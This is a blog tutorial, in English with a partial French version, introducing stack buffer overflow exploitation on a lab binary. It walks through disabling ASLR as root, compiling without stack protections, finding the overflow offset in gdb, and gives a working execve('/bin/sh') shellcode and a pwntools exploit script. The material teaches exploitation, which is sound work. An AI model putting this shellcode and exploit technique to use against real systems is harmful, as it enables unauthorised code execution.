<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.57.2" />

    
    
    

<title>PWN 1/4 : Buffer Overflow, where it all began • Think
Love
Share</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="PWN 1/4 : Buffer Overflow, where it all began"/>
<meta name="twitter:description" content="Introduction to binary exploitation, ELF format and shellcode writing. "/>

<meta property="og:title" content="PWN 1/4 : Buffer Overflow, where it all began" />
<meta property="og:description" content="Introduction to binary exploitation, ELF format and shellcode writing. " />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://thinkloveshare.com/en/hacking/pwn_1of4_buffer_overflow/" />
<meta property="article:published_time" content="2018-05-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2018-05-03T00:00:00+00:00" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
</head>


    <body >
        
<div class="sidebar">
  <div class="container sidebar-about ">
      <span class="site__title">
        <a href="https://thinkloveshare.com//en">Think
Love
Share</a>
      </span>
          <a href="https://thinkloveshare.com//en">
          
          
          
          <div class="author-image">
            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
      <p class="site__description">
        <a href="https://thinkloveshare.com//en">
         InfoSec, Code, Thoughts &amp; Feels 
      </a>
      </p>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/en/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/coding/">
						<span>Coding</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/the_rest/">
						<span>The Rest</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/travels/">
						<span>Travels</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/about/">
						<span>About</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
	
	
  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
  
</section>

    </p>
    <p class="copyright">
      &copy; 2021 Laluka.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>PWN 1/4 : Buffer Overflow, where it all began</h1>
    
    
<div class="post__meta">
    
      <i class="fas fa-calendar-alt"></i> May 3, 2018
    
    
    <i class="fas fa-clock"></i> 21 min read
    <i class="fas fa-globe"></i>
    
    <a href="#fr">Version FR</a>
    
    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
</div>


  </header>
  <hr/>
  <div class="post">
    

<blockquote>
<p>Small edit after the initial publication of the articles:</p>

<p>These four articles lead me to give an &ldquo;pwn introductory&rdquo; conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">here</a> and the video (French only) here :</p>
</blockquote>


<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>


<h2 id="printf-mr-ms-s-bonjour-lecteur">printf(&ldquo;Mr, Ms %s, bonjour. &ldquo;, lecteur);</h2>

<p>Today, I want to offer you an article more sophisticated than usual, the first of  new kind, an article dealing with heavy stuff, in short, an article that blows ass!</p>

<p><img class="img_med" src="/en/hacking/pwn_1of4_buffer_overflow/patrick.jpg" alt="patrick" ></p>

<p>The concept discussed today is quite extensive, so I know that many of you, among my usual readers, will not necessarily be able to understand the entire article, which is why I will try to make it interesting even for neophytes. So if you are a sorcerer&rsquo;s apprentice, be relentless, enjoy it, otherwise, you wan see it as a black magic trick, it&rsquo;s beautiful, it&rsquo;s powerful, but you don&rsquo;t have to understand everything to appreciate it :)</p>

<p>This article is therefore the first of a small series dedicated to buffers overflow!</p>

<p>One last thing before we start&hellip;. <br />
A big shout out to Cyril Bresch who gave me the right to use some of his exercises for this introduction BOF. But especially thanks to him for introducing me to binary exploitation (Well, ok you were paid, but still! :D). <br />
His personal website is hosted here: <a href="https://cyrilbresch.fr/">https://cyrilbresch.fr/</a></p>

<p>What comes next? Shellcodes, assembly, ret2libc, rop, and much more. None of these words mean anything to you? It&rsquo;s normal, don&rsquo;t worry, we&rsquo;ll start easy with some context.</p>

<p>I will try a recursive definition: I start by defining the core of the subject, and every time a new term appears, I define it right after. This should, I hope, allow a fluid reading! :)</p>

<h2 id="buffer-overflow-watizit">Buffer overflow, Watizit?</h2>

<ul>
<li>Buffer:</li>
</ul>

<p>Small recipient in which we store pieces of information in a program. Most of the time, this buffer will contain chars, or a sequence of numbers, or whatever, anyway, they are bits stuck together that form bytes. Buffers are usually stored on the heap or in the stack.</p>

<ul>
<li>Overflow :</li>
</ul>

<p>Action that consists in exceeding the initial size of a buffer, thus affecting the values stored after said buffer. We as hackers are happy when a lot of very useful data can be found after the buffer. The most convenient case being to control the instruction pointer (a register), which tells which piece of code should be executed next. Be able do modity it, and you&rsquo;re all done!
There are many ways to perform an overflow, but also many protections in place.</p>

<ul>
<li>Program:</li>
</ul>

<p>&ldquo;Well, I know what a program is, you click on it and it starts, how lame!&rdquo;</p>

<p>Sure&hellip; But no really. You got the core idea, but most programs work in a command line interface, i.e. they are run by typing commands into a shell. Unlike with windows, where most of the time it is the extension of the file (.txt, .exe, &hellip;) that determines its type, with linux, it is rarely used, we got much better. The window&rsquo;s way of doing so is itself a huge security flaw. More information about this kind of issue here: <a href="https://blog.malwarebytes.com/cybercrime/2014/01/the-rtlo-method/">article_RTLO</a></p>

<p>What replaces this practice is the use of a magic number. It is a sequence of bytes that is put at the beginning of the file and which allows the system to know the type of file it is and version of it. Here, for an ELF, we see:</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/readelf.png" alt="readelf" ></p>

<p>Two notable things here:<br />
 - 45 4c 46 is the ELF&rsquo;s ASCII code: Executable and Linkable Format<br />
 - Type of architecture to launch it: X86-64, so 64 bits.</p>

<ul>
<li>Architecture :</li>
</ul>

<p>There are many types of processors, and each processor has its own set of instructions. Although standards are adopted by manufacturers, each processor retains its own particularities. A non-exhaustive list is available here: <a href="https://en.wikipedia.org/wiki/List_of_instruction_sets">https://en.wikipedia.org/wiki/List_of_instruction_sets</a></p>

<p>The most common architectures are: x86, x86-64, arm, mips,&hellip;</p>

<p>x86 refers to the usual 32bits, and x86-64 to the 64 bits. This difference is due to the size of the registers used for addresses and operation management. A program x32 will work on both archs, but a x64 program will only work on a x64 machine.</p>

<ul>
<li>Linux :</li>
</ul>

<p>Linux is not Unix. If you&rsquo;re there, it&rsquo;s never too late! In short, a large family of open source OS.</p>

<p><a href="https://openclassrooms.com/courses/reprenez-le-controle-a-l-aide-de-linux/mais-c-est-quoi-linux">Linux introduction</a></p>

<ul>
<li>Shell :</li>
</ul>

<p>A shell is a command interpreter. Seen from afar, this is where hooded people type green lines of code on a black terminal. They exist on all OSes because it is necessary to communicate with the system this way. Attention, for each system, there are several implementations and versions.</p>

<p>Example (linux): sh / bash / dash / zsh / fish / &hellip;</p>

<ul>
<li>Stack:</li>
</ul>

<p>The stack is a place used by the processor to store data. It is a LastInFirstOut file. In other words, the last element to be pushed is the first to be popped.</p>

<p><img class="img_med" src="/en/hacking/pwn_1of4_buffer_overflow/stack.png" alt="stack" ></p>

<ul>
<li>Heap :</li>
</ul>

<p>The heap also allows data to be stored, but in a more dynamic / flexible way. It is used (not exclusively) when the malloc functions (memory allocation during program execution) is called.</p>

<ul>
<li>Function:</li>
</ul>

<p>A series of assembly instructions starting (most of the time&hellip;) by booking space on the stack to process data locally, and ending with <code>leave</code> and <code>ret</code> to let the calling program resume at the initial calling state.</p>

<ul>
<li>Shellcode :</li>
</ul>

<p>A series of assembler instructions that spawns a shell.</p>

<ul>
<li>Bits :</li>
</ul>

<p>A data that is worth 0 or 1, atomic unit.</p>

<ul>
<li>Byte :</li>
</ul>

<p>A sequence of 8 bits, encoding an number between 0 and 255.</p>

<p>Well, take a break, take a deep breath, make yourself comfy in your chair&hellip; <br />
And we&rsquo;re going back!</p>

<h2 id="disable-security">Disable security:</h2>

<p>The first thing to do for a first approach is to disable the protections in place, because trying to learn this subject with all the protections currently used: RIP!</p>

<p>We start by disabling the ASLR, it is a kernel parameter (kernel of the system, which manages almost everything) that indicates whether or not to place the different segments of a program at random addresses. Here, we will use the stack, so we don&rsquo;t want it to move at all.</p>

<pre><code class="language-shell"># As root:
echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>

<p>We will then compile the program so that:</p>

<ul>
<li><p>There is no stack canary, in other words, no value placed at the end of the buffer, which is checked and screams if it has been overwritten (so if it detects a buffer overflow)</p></li>

<li><p>The stack is executable, otherwise, an NX bit is placed there. This bit of information means that it is not possible to execute the data (here assembly instructions) found there. It is therefore impossible for us to execute the code of our choice.</p></li>

<li><p>The Position Independent Code is disabled (do not place the different segments of our program in random places).</p></li>
</ul>

<p>We therefore use the following compilation line:</p>

<pre><code class="language-shell">$ gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
</code></pre>

<p>We will also need a few tools:</p>

<ul>
<li><p>python: Language and interpreter, version 2 for less annoying encoding reasons</p></li>

<li><p>gdb : Gnu debugger, useful to understand what&rsquo;s going on in the program</p></li>

<li><p>gdb-peda: gdb improved with python scripting, makes gdb easier to use</p></li>

<li><p>pwntool : Not much used here, this python tool makes it easier to perform binary exploits</p></li>
</ul>

<h2 id="recon">Recon</h2>

<p>The studied binary is downloadable <a href="/hacking/pwn_1of4_buffer_overflow/vuln">here</a></p>

<p>Okay, it needs an argument. What is done with it?</p>

<p>Seems like, nothing&hellip; It&rsquo;s only a test program, we don&rsquo;t care! <code>¯\_(ツ)_/¯</code></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/recon.png" alt="recon" ></p>

<p>Find the crash:</p>

<p>The usual beginner strategy, long arguments.</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/crash.png" alt="crash" ></p>

<p>Hey, that looks good!</p>

<p>Let&rsquo;s just pass it a long argument in order to make it crash!</p>

<p>Offset research:</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_create.png" alt="pattern_create" ></p>

<p>Create the pattern (easily recognizable, that will be used to understand which registers are reachable by our input), then run the program with the pattern as parameter.</p>

<p>We see here that the crash occurs on the <code>ret</code> instruction (code section, small arrow on the left).</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_run.png" alt="pattern_search" ></p>

<p>After the crash, we search the pattern in the memory:</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_search.png" alt="pattern_search" ></p>

<p>The memory analysis has found pieces of our pattern in different places, so we see that the RSP (Registre Stack Pointer) is 40 bytes away from our input start.</p>

<p>But we already know that the crash occurs on a ret. Ret is an instruction that stores the last element of the stack in RIP (Instruction Pointer) to return to the main program in order to continue its execution. So controlling RSP before a ret means controlling  RIP. Controlling RIP means being able to divert the execution flow of or target, and&hellip;</p>

<p>And it&rsquo;s a win-win! <code>^~^</code></p>

<p>Shellcode search:</p>

<p>We do know where we are going to inject. What we now need a shellcode, a good one, a real one! :D</p>

<p>A quick tour on <a href="http://shell-storm.org/shellcode/">shellstorm</a> or <a href="https://www.exploit-db.com/">exploit-db</a>, choose the right architecture, &hellip;</p>

<p>Here, the shellcode is homemade, because the general idea remains the same: Place the right parameters in the registers, then trigger a syscall so that the kernel executes what you want, here a shell.</p>

<p>Shellcode :</p>

<p><code>\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05</code></p>

<p>We&rsquo;re still going to disassemble it to understand what it does, thanks to this site: <a href="https://onlinedisassembler.com">https://onlinedisassembler.com</a></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/shellcode.png" alt="shellcode" ></p>

<pre><code>0  : &quot;//bin/sh&quot; dans rax
A  : &quot;/bin/sh\x00&quot; dans rax
E  : push rax in the stack
F  : rdi now points to the stack
12 : 0 in rax
15 : 59 in rax (execve)
17 : 0 in rsi
1a : 0 in rdx
1d : Init the syscall
</code></pre>

<p>This will execute <code>/bin/sh</code> using the execve syscall.</p>

<p>The parameters to use are found using this doc: <br />
<a href="https://w3challs.com/syscalls/?arch=x86_64">https://w3challs.com/syscalls/?arch=x86_64</a></p>

<h2 id="development-of-the-exploit">Development of the exploit</h2>

<p>We want to put our shellcode in a known place, then reach a size of 40 bytes to place the address of the shellcode to execute. Yapluka!</p>

<p>Our payload (data sent during the attack) will therefore have the following structure:<br />
PADDING + SHELLCODE + SHELLCODE_ADDRESS</p>

<p>To find out where the data entered by the user is located, in gdb:</p>

<p>Disassemble the main (name convention for the main function of the program), define a breakpoint before the end of the execution, then run it with AAAA as a parameter.</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/disas_main.png" alt="disas_main" ></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/find.png" alt="find" ></p>

<p>Once stopped, our input is in the stack, at the address: 0x7fffffffe570</p>

<p>And our shellcode will be a little farther, because of the padding.</p>

<p>Python code of the exploit:</p>

<pre><code class="language-python">#!/usr/bin/env python2

from pwn import *

def save(what, where):
  with open(where, &quot;wb&quot;) as f:
    f.write(what)

shellcode = &quot;\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68&quot;
shellcode += &quot;\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31&quot;
shellcode += &quot;\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05&quot;

offset = 40
count_A = offset - len(shellcode)
padding = &quot;A&quot; * count_A
addr_input = 0x7fffffffe570 # Depends on your OS
addr_shellcode = addr_input + count_A
log.info(&quot;Shellcode at 0x{:8x}&quot;.format(addr_shellcode))

payload = padding + shellcode + p64(addr_shellcode)

save(payload, &quot;payload&quot;)
log.success(&quot;Payload written&quot;)
</code></pre>

<p>To run the exploit, all you have to do is give its output to the program as an argument:</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/run_exploit.png" alt="run_exploit" ></p>

<p>And BIM! Spawned a shell! <code>\o/</code></p>

<p><img class="img_small" src="/en/hacking/pwn_1of4_buffer_overflow/like_a_boss.png" alt="like_a_boss" ></p>

<h2 id="notes-and-reflection">Notes and Reflection:</h2>

<ul>
<li>Note 1</li>
</ul>

<p>In this example, an error has been hidden, will you be able to find it?</p>

<p><em>-[ SPOIL ]-</em></p>

<p>This shellcode contains null-bytes (<code>\x00</code>, a sentinel which in C, refers to the end of a string) that are very poorly managed by bash. If the argument had been passed directly, bash would have cut it off. Going through a file allows you to send everything to the program, even null-bytes. But this does not solve the problem entirety. Indeed, the vulnerable function here is strcpy. It copies a string and stops at the first sentinel (i.e. null-byte, i.e. 0x00, i.e. ShellCodeBreakerOfDoom). Our exploit still works because they appear at the end or our payload as an address. And we paste this stack address on&hellip; A stack address, so the 0x00 are already present.</p>

<p>Thinking: How to fix the shellcode so that it no longer uses null-byte?</p>

<ul>
<li>Note 2</li>
</ul>

<p>This example is limited because the size available before the EIP is very small. That&rsquo;s enough for spawning a shell, but not for much more. In addition, since this space is close to the addresses used, it may be altered during execution. It&rsquo;s annoying, isn&rsquo;t it?</p>

<p>Reflection: How to use a shellcode of arbitrarily long size?</p>

<ul>
<li>Note 3</li>
</ul>

<p>This example only works if the ASLR is disabled because it is highly dependent on the stack. There are many ways to bypass the ASLR&hellip; More in the next articles&hellip; Pwn-knowledge, one drop at a time! :D</p>

<p>Huh ? You read this far? Hatzoff, my friend!</p>

<p>You&rsquo;re a magician now! Almost&hellip; ;)</p>

<p><img class="img_small" src="/en/hacking/pwn_1of4_buffer_overflow/blair.png" alt="blair" ></p>

<p>This being my first article on the subject, I know it will be incomplete, and full of inaccuracies if not errors. Feedback are welcome for typos, missing details, errors, &hellip; <code>^.^</code></p>

<ul>
<li>Hints</li>
</ul>

<p>-Use&hellip; Xor? Add? Sub? Other? <br />
 -Environmental variables? Order of the padding and shellcode in out payload?</p>

<p>I hope you appreciated this first step into the pwning world,</p>

<h2 id="fr">French version</h2>

<blockquote>
<p>Petit ajout après la publication des articles :</p>

<p>Ces quatres articles ont donné lieu à une conférence d&rsquo;introduction au pwn à la HitchHack 2018. Elle résume les 3 premiers articles mais rentre moins dans le détail. Si ce format vous convient mieux, les slides sont téléchargables <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">ici</a> et la vidéo (francais uniquement) ici :</p>
</blockquote>


<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>


<h2 id="printf-dear-s-welcome-reader">printf(&ldquo;Dear %s, welcome. &ldquo;, reader);</h2>

<p>Aujourd&rsquo;hui, je vous propose un article plus hardu, un article plus poilu, un article plus barbu, en bref, un article qui pète des culs !</p>

<p><img class="img_med" src="/en/hacking/pwn_1of4_buffer_overflow/patrick.jpg" alt="patrick" ></p>

<p>La notion abordée aujourd&rsquo;hui est assez poussée, donc je sais que parmi les lecteurs habituels, vous serez nombreux à ne pas forcément pouvoir comprendre la totalité de l&rsquo;article, c&rsquo;est pourquoi je vais tenter de le rendre intéressant même pour les néophytes. Donc si vous êtes un apprenti sorcier, acharnez vous, profitez en, sinon, regardez ca comme un tour de magie noir, c&rsquo;est beau, c&rsquo;est puissant, mais il n&rsquo;est pas nécessaire de tout comprendre pour apprécier :)</p>

<p>Cet article est donc le premier d&rsquo;une petite série dédiée aux buffers overflow !</p>

<p>Dernière chose avant de commencer&hellip; <br />
Merci à Cyril Bresch qui m&rsquo;a donné le droit d&rsquo;utiliser certains de ses exos pour cette introduction aux buffers overflow. Mais surtout merci à lui pour m&rsquo;avoir initié à l&rsquo;exploitation binaire (Bon, ok t&rsquo;étais payé, but still ! :D ). <br />
Son site perso est dispo ici : <a href="https://cyrilbresch.fr/">https://cyrilbresch.fr/</a></p>

<p>En prévision, des shellcodes, de l&rsquo;assembleur, du ret2libc, du rop, et bien plus encore. Ces mots ne vous disent rien ? C&rsquo;est normal, ne vous en faites pas, on va commencer tranquilou avec une mise en contexte.</p>

<p>Je vais tenter une définition récursive : Je commence par définir le coeur du sujet, et à chaque fois qu&rsquo;un terme nouveau apparait, je le défini juste après. Ceci devrait permettre, je l&rsquo;espère, une lecture fluide ! :)</p>

<h2 id="buffer-overflow-keskecé">Buffer overflow, Keskecé ?</h2>

<ul>
<li>Buffer :</li>
</ul>

<p>Petit conteneur dans lequel on va stocker de l&rsquo;information dans un programme. La plupart du temps, ce buffer, ou tampon, va contenir des caractères, ou une suite de nombres, ou peu importe, de toute facon, c&rsquo;est des bits collés les uns aux autres qui forment des bytes. Les buffers sont la plupart du temps stockés sur le heap ou dans la stack.</p>

<ul>
<li>Overflow :</li>
</ul>

<p>Action de dépasser la taille initialement prévue pour un buffer, affectant ainsi les valeurs stockées après ledit buffer. Là où en tant que hackeur on est content, c&rsquo;est que pleins de données très utiles peuvent se trouver après le buffer. Le cas le plus arrangeant étant de contrôler le registre d&rsquo;instructions, qui dit quel code doit être exécuté. Arriver à l&rsquo;affecter, et le tour est joué !<br />
Il existe de nombreuses facons d&rsquo;effectuer un overflow, mais également un grand nombre de protections mises en place.</p>

<ul>
<li>Programme :</li>
</ul>

<p>&ldquo;Bah je sais ce que c&rsquo;est un programme, tu click et ca se lance tavu !&rdquo;</p>

<p>Oui&hellip; Mais non. Dans l&rsquo;idée c&rsquo;est ca, mais la plupart des programmes fonctionnent en ligne de commande, c&rsquo;est à dire qu&rsquo;on les lance en tapant des commandes dans un shell. Contrairement à windows, ou le plus souvent c&rsquo;est l&rsquo;extension du nom du fichier (.txt, .exe, &hellip;) qui détermine son type, sous linux, ce n&rsquo;est que très rarement utilisé, et tant mieux car cette pratique est une énorme faille de sécurité. Plus d&rsquo;infos sur la faille ici : <a href="https://blog.malwarebytes.com/cybercrime/2014/01/the-rtlo-method/">article_RTLO</a></p>

<p>Ce qui remplace cette pratique est l&rsquo;usage de magic number. En bref, c&rsquo;est une suite de bytes que l&rsquo;on met en début de fichier et qui permet de connaître le type et la version du fichier. Ici, pour un programme, ELF sous linux, on voit :</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/readelf.png" alt="readelf" ></p>

<p>Deux choses notables :<br />
 - 45 4c 46 est le code ASCII de ELF : Executable and Linkable Format<br />
 - Type d&rsquo;architecture pour le lancer : X86-64, donc du 64 bits.</p>

<ul>
<li>Architecture :</li>
</ul>

<p>Il existe de nombreux types de processeurs, et chaque processeur à son propre jeu d&rsquo;instructions. Bien que des standards soient adoptés par les constructeurs, chaque processeur garde ses particularités. Une liste non exhaustive est disponible ici : <a href="https://en.wikipedia.org/wiki/List_of_instruction_sets">https://en.wikipedia.org/wiki/List_of_instruction_sets</a></p>

<p>Les architectures les plus courantes sont : x86, x86-64, arm, mips, &hellip;</p>

<p>x86 désigne l&rsquo;habituel 32bits, et x86-64 le 64 bits. Cette différence est due à la taille des registres utilisés pour la gestion des adresses et opérations. Un programme 32 marchera sur <sup>32</sup>&frasl;<sub>64</sub>, un programme 64 uniquement sur du 64.</p>

<ul>
<li>Linux :</li>
</ul>

<p>Linux is not Unix. Si vous en êtes là, il n&rsquo;est jamais trop tard ! En bref, une grande famille d&rsquo;OS open source.</p>

<p><a href="https://openclassrooms.com/courses/reprenez-le-controle-a-l-aide-de-linux/mais-c-est-quoi-linux">Introduction linux</a></p>

<ul>
<li>Shell :</li>
</ul>

<p>Un shell est un interpréteur de commandes. Vu de loin, c&rsquo;est là ou les gens à capuche tapent des lignes de code en vert sur fond noir. Il y en a sous tous les OS communs car c&rsquo;est indispensable pour communiquer avec le système. Attention, pour un système, il existe plusieurs implémentations, plusieurs versions.</p>

<p>Exemple (linux) : sh / bash / dash / zsh / fish / &hellip;</p>

<ul>
<li>Stack :</li>
</ul>

<p>La pile est un endroit utilisé par le processeur pour stocker des données. C&rsquo;est un fonctionnement LastInFirstOut. Autrement dit, le dernier élément qui arrive est le premier à sortir.</p>

<p><img class="img_med" src="/en/hacking/pwn_1of4_buffer_overflow/stack.png" alt="stack" ></p>

<ul>
<li>Heap :</li>
</ul>

<p>Le tas permet aussi de stocker des données, mais de manière plus dynamique / flexible. Il est utilisé (entre autre) lors de l&rsquo;usage de fonctions type malloc (allocation de mémoire en cours d&rsquo;exécution du programme).</p>

<ul>
<li>Fonction :</li>
</ul>

<p>Suite d&rsquo;instructions assembleur commencant (le plus souvent&hellip;) par faire de la place sur la stack pour traiter des données en local, et se terminant par <code>leave</code> et <code>ret</code> afin de laisser le programme appelant reprendre au point d&rsquo;appel.</p>

<ul>
<li>Shellcode :</li>
</ul>

<p>Suite d&rsquo;instructions assembleur permettant d&rsquo;invoquer un shell.</p>

<ul>
<li>Bits :</li>
</ul>

<p>Une donnée valant 0 ou 1, unité atomique.</p>

<ul>
<li>Byte :</li>
</ul>

<p>Suite de 8 bits, codant donc un number compris entre 0 et 255.</p>

<p>Allez, petite pause, on respire un grand coup, on s&rsquo;installe confortablement sur sa chaise&hellip;<br />
Et on y retourne !</p>

<h2 id="désactiver-les-sécurités">Désactiver les sécurités :</h2>

<p>La première chose à faire pour une première approche est de désactiver les protections mises en place, car aborder le sujet avec toutes les protections actuellement utilisées : RIP !</p>

<p>On commence par désactiver l&rsquo;ASLR, c&rsquo;est un paramètre du kernel (noyau du système, ce qui gère quasiment tout) qui indique s&rsquo;il faut oui ou non placer les différents segments d&rsquo;un programme à des adresses aléatoires. Ici, on va utiliser la stack, on ne veut donc pas de randomisation afin de faciliter l&rsquo;exploit.</p>

<pre><code class="language-shell">$ # En tant que root :
$ echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>

<p>On va ensuite compiler le programme de manière à ce que :</p>

<ul>
<li><p>Il n&rsquo;y ait pas de stack canary, autrement dit, pas de valeur placée en fin de buffer, qui est vérifiée et hurle à la mort si on l&rsquo;a écrasée (donc si elle détecte un buffer overflow)</p></li>

<li><p>La stack soit exécutable, sinon, un bit NX y est placé. Ce bit d&rsquo;information signifie qu&rsquo;il n&rsquo;est pas possible d&rsquo;exécuter les données (ici instructions assembleur) qui s&rsquo;y trouvent. Il nous est donc impossible pour nous d&rsquo;exécuter le code de notre choix.</p></li>

<li><p>Le Position Independent Code soit désactive (ne pas placer à des endroits aléatoires les différents segments de notre programme).</p></li>
</ul>

<p>On utilise donc la ligne de compilation suivante :</p>

<pre><code class="language-shell">$ gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
</code></pre>

<p>Nous allons également avoir besoin de quelques outils :</p>

<ul>
<li><p>python : Langage et interpréteur, version 2 pour raisons d&rsquo;encodage moins chiant</p></li>

<li><p>gdb : Gnu debugger, utile pour comprendre ce qu&rsquo;il se passe dans le programme</p></li>

<li><p>gdb-peda : gdb amélioré avec du scripting python, facilite l&rsquo;utilisation de gdb</p></li>

<li><p>pwntool : Peu utilisé ici, cet outil python permet de faciliter l&rsquo;exploit binaire</p></li>
</ul>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>Le binaire étudié est téléchargable <a href="/hacking/pwn_1of4_buffer_overflow/vuln">ici</a></p>

<p>Ok, il prend un argument. Il en fait quoi ?</p>

<p>A priori, rien&hellip; Prog de test, osef ! <code>¯\_(ツ)_/¯</code></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/recon.png" alt="recon" ></p>

<p>Trouver le point de crash :</p>

<p>La strat habituelle de débutant, des arguments longs.</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/crash.png" alt="crash" ></p>

<p>Ah, ca, ca sent bon !</p>

<p>On a qu&rsquo;a lui donner un argument long pour le faire crash !</p>

<p>Recherche de l&rsquo;offset :</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_create.png" alt="pattern_create" ></p>

<p>Créer le pattern (schéma facilement reconnaissable qui va servir à comprendre quels registres sont atteignables par notre input), puis lancer le programme avec le pattern en paramètre.</p>

<p>On voit ici que le crash survient sur l&rsquo;instruction <code>ret</code> (section code, petite flèche à gauche).</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_run.png" alt="pattern_search" ></p>

<p>Après le crash, on cherche le pattern dans la mémoire :</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/pattern_search.png" alt="pattern_search" ></p>

<p>L&rsquo;analyse de la mémoire a retrouvé des morceaux de notre pattern à différents endroits, on voit donc que le RSP (Registre Stack Pointer) est au 40ème byte de notre input.</p>

<p>Mais nous savons déjà que le crash survient sur un ret. Ret est une instruction qui place le dernier élément de la pile dans RIP (Instruction Pointer) pour retourner au programme principal afin de poursuivre son exécution. Donc contrôler RSP avant un ret, c&rsquo;est contrôler RIP. Contrôler RIP, c&rsquo;est pouvoir détourner le flot d&rsquo;exécution du programme, et&hellip;</p>

<p>Et c&rsquo;est gagné du coup ! <code>^~^</code></p>

<p>Recherche du Shellcode :</p>

<p>On sait maintenant à peu près où on va injecter. Ce qu&rsquo;il nous faut maintenant c&rsquo;est un shellcode, un bon, un vrai ! :D</p>

